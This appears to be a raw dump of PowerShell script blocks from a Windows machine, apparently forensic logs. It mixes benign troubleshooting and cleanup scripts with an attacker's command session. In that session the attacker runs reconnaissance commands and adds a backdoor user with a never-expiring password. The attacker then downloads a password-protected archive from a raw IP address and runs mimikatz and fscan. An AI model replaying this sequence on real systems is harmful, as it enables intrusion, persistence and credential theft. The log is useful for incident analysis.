$localizationString.AdminTSHistoryInfo_name -Description $localizationString.AdminTSHistoryInfo_description -rid \"RC_DiagnosticHistory\"\r\n\r\n\r\nif(Test-UnnecessaryFiles $userTSHistoryPath) {\r\n    Update-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n    return\r\n}\r\n\r\nif(Test-UnnecessaryFiles $adminTSHistoryPath) {\r\n    Update-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $true -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n    return\r\n}\r\n\r\nUpdate-DiagRootcause -ID \"RC_DiagnosticHistory\" -Detected $false -Parameter @{'UnwantedSpace'=(Format-DiskSpaceMB $totalSize)}\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"# Localized\t12/07/2019 05:47 AM (GMT)\t303:6.40.20520 \tCL_LocalizationData.psd1\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nfilesFailToRemove_description=Exceptions caught while removing files.\r\ncheckBrokenDesktopShortcuts_progress=Checking for broken shortcuts...\r\ncheckBrokenStartupShortcuts_progress=Checking for broken startup links...\r\nbrokenDesktopShortcuts_name=Broken desktop shortcuts\r\nbrokenDesktopShortcuts_description=List of desktop shortcuts for which the target executable no longer exists.\r\nbrokenStartupShortcuts_name=Broken startup shortcuts\r\nbrokenStartupShortcuts_description=List of startup shortcuts for which the target executable no longer exists.\r\ndeleteBrokenDesktopShortcuts_progress=Deleting broken shortcuts...\r\ndeleteBrokenStartupShortcuts_progress=Deleting broken startup links...\r\ncheckSystemTime_progress=Checking clock time...\r\nsyncSystemTime_progress=Synchronizing clock time...\r\ntimeDelayAgainstTimeServer_name=Clock synchronization\r\ncheckUnusedDesktopIcons_progress=Checking for unused desktop icons...\r\nunusedDesktopShortcuts_name=Unused desktop shortcuts\r\nunusedDesktopShortcuts_description=List of shortcuts that have not been recently accessed for\r\nunusedTimeUnit=months.\r\ndeleteUnusedDesktopShortcuts_progress=Deleting unused shortcuts...\r\ntimeServerName=Time server name\r\nsamplesCollected=Samples collected\r\nserverTime=Server time\r\nlocalTime=Local time\r\ntimeDifference=Time difference\r\nshortcutName=Shortcut name\r\nCheckWERQueue=Checking for unnecessary files...\r\nDeleteUserWERQueue=Deleting Windows error reports...\r\nDeleteSystemWERQueue=Deleting Windows error reports...\r\nCheckTSHistory=Checking for unnecessary files...\r\nDeleteUserTSHistory=Deleting troubleshooting history...\r\nDeleteAdminTSHistory=Deleting troubleshooting history...\r\nfreeSpace=Free space\r\ntotalSpace=Total space\r\ndriveName=Drive name\r\nsystemDriveInfo_name=Disk information\r\nsystemDriveInfo_description=Details of the system drive.\r\nUserReportInfo_name=User Report details\r\nUserReportInfo_description=Details of the Windows error reporting user queue.\r\nuserReportPath=Folder name\r\nuserReportSpace=Disk space\r\nMachineReportInfo_name=System report details\r\nMachineReportInfo_description=Details of the Windows error reporting system queue.\r\nMachineReportPath=Folder name\r\nMachineReportSpace=Disk space\r\nreclaimedUserReportSize=Reclaimed space\r\nReclaimedUserReportInfo_name=Deleted user reports\r\nReclaimedUserReportInfo_description=Details of the updated Windows error reporting user queue.\r\nreclaimedMachineReportSize=Reclaimed space\r\nReclaimedMachineReportInfo_name=Deleted system reports\r\nReclaimedMachineReportInfo_description=Details of the updated Windows error reporting system queue.\r\nuserTSHistoryPath=Folder name\r\nadminTSHistoryPath=Folder name\r\nUserTSHistoryInfo_name=User troubleshooting history details\r\nUserTSHistoryInfo_description=Details of the user troubleshooting history logs.\r\nAdminTSHistoryInfo_name=Administrator troubleshooting history details\r\nAdminTSHistoryInfo_description=Details of the administrator troubleshooting history logs.\r\nReclaimedUserTSHistroyInfo_name=Deleted user troubleshooting history\r\nReclaimedUserTSHistroyInfo_description=Details of the updated user troubleshooting history folder.\r\nReclaimedAdminTSHistroyInfo_name=Deleted administrator troubleshooting history\r\nReclaimedAdminTSHistroyInfo_description=Details of the updated administrator troubleshooting history folder.\r\nuserTSHistorySize=Disk space\r\nadminTSHistorySize=Disk space\r\n###PSLOC\r\n'@\r\n"
"function Get-UserTSHistoryPath {\r\n    return \"${env:localappdata}\\diagnostics\"\r\n}"
"function Get-AdminTSHistoryPath {\r\n    return \"${env:localappdata}\\elevateddiagnostics\"\r\n}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"{$_.Name}"
"{(Format-DiskSpaceMB $_.Space) + \"MB\"}"
"function Test-UnnecessaryFiles([string]$folder = $(throw \"No folder is specified\")) {\r\n    if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) {\r\n        return $false\r\n    }\r\n\r\n    [int]$threshold = -1\r\n    $folders = Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}\r\n\r\n    return ($folders -ne $null)\r\n}"
null
null
null
null
null
null
"$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;"
"Write-Host 'Final result: 1';"
"$global:?"
"$global:?"
null
null
null
null
null
null
"Write-Host 'Final result: 1';"
"$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;"
"$global:?"
"$global:?"
null
null
null
null
null
null
"$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;"
"Write-Host 'Final result: 1';"
null
null
null
"prompt"
"prompt"
"prompt"
"whoami"
"prompt"
"systeminfo"
"prompt"
"net user /domain"
"prompt"
"net user"
"prompt"
"net user Guess password /ADD"
"prompt"
null
null
null
"Write-Host 'Final result: 1';"
"$global:?"
"Set-LocalUser -Name Guess -PasswordNeverExpires $true"
"prompt"
null
null
null
"$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;"
"pwd"
"prompt"
"ipconfig"
"prompt"
"$global:?"
"cd C:\\User"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"cd C:\\Users"
"prompt"
"dir"
"prompt"
"cd tommyxiaomi"
"prompt"
"cd Documents"
"prompt"
"dir"
"prompt"
"Invoke-WebRequest -URI \"http://13.53.200.146/intel.zip\" -OutFile \"./intel.zip\""
"prompt"
"prompt"
"prompt"
"prompt"
"prompt"
"prompt"
"prompt"
"dir"
"prompt"
"&\"C:\\Program Files\\7-Zip\\7z.exe\" x -p hoilamgi intel.zip"
"prompt"
"&\"C:\\Program Files\\7-Zip\\7z.exe\" x -phoilamgi intel.zip"
"prompt"
"dir"
"prompt"
"./mimikatz.exe"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"./fscan64.exe"
"{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"{ Set-StrictMode -Version 1; $_.OriginInfo }"
"prompt"
"dir"
"prompt"
"dir"
"prompt"
null
"\r\n# Caller validation to ensure we are calling from and actual script, and not from a malicious command line\r\nfunction Test-Caller {\r\n    param(\r\n        [Parameter(Mandatory=$true)]\r\n        [System.Management.Automation.CallStackFrame[]]\r\n        $CallStack\r\n    )\r\n    $caller = $CallStack[1]\r\n    $location = $caller.Location\r\n    Write-Verbose -Message $('caller: ' + $location) -Verbose\r\n    if ($location -eq '<No file>') {\r\n        throw 'Invoke-Expression cannot be used in a script'\r\n    }\r\n}\r\n\r\n# Generated with\r\n# $var = New-Object System.Management.Automation.CommandMetadata (Get-Command Invoke-Expression)\r\n# [System.Management.Automation.ProxyCommand]::Create($var) | Out-File .\\Invoke-Expression.ps1\r\nfunction Invoke-Expression {\r\n    [CmdletBinding(HelpUri='https://go.microsoft.com/fwlink/?LinkID=2097030')]\r\nparam(\r\n    [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [string]\r\n    ${Command})\r\n\r\nbegin\r\n{\r\n    try {\r\n        Test-Caller -CallStack (Get-PSCallStack)\r\n        $outBuffer = $null\r\n        if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))\r\n        {\r\n            $PSBoundParameters['OutBuffer'] = 1\r\n        }\r\n\r\n        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Utility\\Invoke-Expression', [System.Management.Automation.CommandTypes]::Cmdlet)\r\n        $scriptCmd = {& $wrappedCmd @PSBoundParameters }\r\n\r\n        $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)\r\n        $steppablePipeline.Begin($PSCmdlet)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nprocess\r\n{\r\n    try {\r\n        $steppablePipeline.Process($_)\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n\r\nend\r\n{\r\n    try {\r\n        $steppablePipeline.End()\r\n    } catch {\r\n        throw\r\n    }\r\n}\r\n<#\r\n\r\n.ForwardHelpTargetName Microsoft.PowerShell.Utility\\Invoke-Expression\r\n.ForwardHelpCategory Cmdlet\r\n\r\n#>\r\n}\r\n\r\n# Generated with\r\n# $var = New-Object System.Management.Automation.CommandMetadata (Get-Command Invoke-Command)\r\n# [System.Management.Automation.ProxyCommand]::Create($var) | Out-File .\\Invoke-Command.ps1\r\nfunction Invoke-Command {\r\n    [CmdletBinding(DefaultParameterSetName='InProcess', HelpUri='https://go.microsoft.com/fwlink/?LinkID=2096789', RemotingCapability='OwnedByCommand')]\r\n    param(\r\n        [Parameter(ParameterSetName='Session', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathRunspace', Position=0)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [System.Management.Automation.Runspaces.PSSession[]]\r\n        ${Session},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', Position=0)]\r\n        [Alias('Cn')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${ComputerName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='Uri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathUri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [pscredential]\r\n        [System.Management.Automation.CredentialAttribute()]\r\n        ${Credential},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [ValidateRange(1, 65535)]\r\n        [int]\r\n        ${Port},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [switch]\r\n        ${UseSSL},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='Uri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathUri', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='ContainerId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='VMName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', ValueFromPipelineByPropertyName=$true)]\r\n        [string]\r\n        ${ConfigurationName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathComputerName', ValueFromPipelineByPropertyName=$true)]\r\n        [string]\r\n        ${ApplicationName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [int]\r\n        ${ThrottleLimit},\r\n\r\n        [Parameter(ParameterSetName='Uri', Position=0)]\r\n        [Parameter(ParameterSetName='FilePathUri', Position=0)]\r\n        [Alias('URI','CU')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [uri[]]\r\n        ${ConnectionUri},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [switch]\r\n        ${AsJob},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Alias('Disconnected')]\r\n        [switch]\r\n        ${InDisconnectedSession},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${SessionName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [Alias('HCN')]\r\n        [switch]\r\n        ${HideComputerName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [string]\r\n        ${JobName},\r\n\r\n        [Parameter(ParameterSetName='ComputerName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='Session', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='Uri', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='InProcess', Mandatory=$true, Position=0)]\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='ContainerId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='SSHHost', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='SSHHostHashParam', Mandatory=$true, Position=1)]\r\n        [Alias('Command')]\r\n        [ValidateNotNull()]\r\n        [scriptblock]\r\n        ${ScriptBlock},\r\n\r\n        [Parameter(ParameterSetName='InProcess')]\r\n        [switch]\r\n        ${NoNewScope},\r\n\r\n        [Parameter(ParameterSetName='FilePathComputerName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathRunspace', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathUri', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', Mandatory=$true, Position=1)]\r\n        [Parameter(ParameterSetName='FilePathSSHHost', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash', Mandatory=$true)]\r\n        [Alias('PSPath')]\r\n        [ValidateNotNull()]\r\n        [string]\r\n        ${FilePath},\r\n\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [switch]\r\n        ${AllowRedirection},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [System.Management.Automation.Remoting.PSSessionOption]\r\n        ${SessionOption},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [System.Management.Automation.Runspaces.AuthenticationMechanism]\r\n        ${Authentication},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [switch]\r\n        ${EnableNetworkAccess},\r\n\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [switch]\r\n        ${RunAsAdministrator},\r\n\r\n        [Parameter(ParameterSetName='SSHHost', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHost', Mandatory=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${HostName},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string]\r\n        ${UserName},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Alias('IdentityFilePath')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string]\r\n        ${KeyFilePath},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [string]\r\n        ${Subsystem},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [int]\r\n        ${ConnectingTimeout},\r\n\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [ValidateSet('true')]\r\n        [switch]\r\n        ${SSHTransport},\r\n\r\n        [Parameter(ParameterSetName='SSHHostHashParam', Mandatory=$true)]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash', Mandatory=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [hashtable[]]\r\n        ${SSHConnection},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Session')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [Parameter(ParameterSetName='FilePathComputerName')]\r\n        [Parameter(ParameterSetName='FilePathRunspace')]\r\n        [Parameter(ParameterSetName='FilePathUri')]\r\n        [Parameter(ParameterSetName='VMId')]\r\n        [Parameter(ParameterSetName='VMName')]\r\n        [Parameter(ParameterSetName='ContainerId')]\r\n        [Parameter(ParameterSetName='FilePathVMId')]\r\n        [Parameter(ParameterSetName='FilePathVMName')]\r\n        [Parameter(ParameterSetName='FilePathContainerId')]\r\n        [Parameter(ParameterSetName='SSHHost')]\r\n        [Parameter(ParameterSetName='SSHHostHashParam')]\r\n        [Parameter(ParameterSetName='FilePathSSHHost')]\r\n        [Parameter(ParameterSetName='FilePathSSHHostHash')]\r\n        [switch]\r\n        ${RemoteDebug},\r\n\r\n        [Parameter(ValueFromPipeline=$true)]\r\n        [psobject]\r\n        ${InputObject},\r\n\r\n        [Alias('Args')]\r\n        [System.Object[]]\r\n        ${ArgumentList},\r\n\r\n        [Parameter(ParameterSetName='VMId', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMId', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]\r\n        [Alias('VMGuid')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [guid[]]\r\n        ${VMId},\r\n\r\n        [Parameter(ParameterSetName='VMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathVMName', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${VMName},\r\n\r\n        [Parameter(ParameterSetName='ContainerId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [Parameter(ParameterSetName='FilePathContainerId', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [string[]]\r\n        ${ContainerId},\r\n\r\n        [Parameter(ParameterSetName='ComputerName')]\r\n        [Parameter(ParameterSetName='Uri')]\r\n        [string]\r\n        ${CertificateThumbprint})\r\n\r\n    begin\r\n    {\r\n        try {\r\n            Test-Caller -CallStack (Get-PSCallStack)\r\n            $outBuffer = $null\r\n            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))\r\n            {\r\n                $PSBoundParameters['OutBuffer'] = 1\r\n            }\r\n\r\n            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Core\\Invoke-Command', [System.Management.Automation.CommandTypes]::Cmdlet)\r\n            $scriptCmd = {& $wrappedCmd @PSBoundParameters }\r\n\r\n            $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)\r\n            $steppablePipeline.Begin($PSCmdlet)\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n\r\n    process\r\n    {\r\n        try {\r\n            $steppablePipeline.Process($_)\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n\r\n    end\r\n    {\r\n        try {\r\n            $steppablePipeline.End()\r\n        } catch {\r\n            throw\r\n        }\r\n    }\r\n    <#\r\n\r\n    .ForwardHelpTargetName Microsoft.PowerShell.Core\\Invoke-Command\r\n    .ForwardHelpCategory Cmdlet\r\n\r\n    #>\r\n\r\n}\r\n\r\n# Exporting function overrides\r\nExport-ModuleMember -Function @(\r\n    'Invoke-Expression'\r\n    'Invoke-Command'\r\n)"
"& 'C:\\Windows\\TEMP\\SDIAG_5d714a56-ed76-4941-ae1e-d3b1d5312085\\TS_WERQueue.ps1'"
